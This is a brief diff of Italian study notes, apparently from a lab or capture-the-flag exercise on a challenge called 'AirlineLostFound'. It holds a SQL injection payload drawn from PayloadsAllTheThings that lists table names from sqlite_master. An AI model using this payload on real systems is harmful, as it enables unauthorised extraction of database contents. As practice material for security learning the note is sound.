@@ -1,7 +1,7 @@
 N.B. Utilizzo la repository " PayloadsAllTheThings"
 #------------------------------------------------------#
 
-[LOST ITEM]
+[AirlineLostFound]
 
 1 query estraggo i nomi delle tabelle-> Prova') OR 1=1 )UNION SELECT tbl_name,2,3,4,5,6,7,8 FROM sqlite_master WHERE type='table' --
 
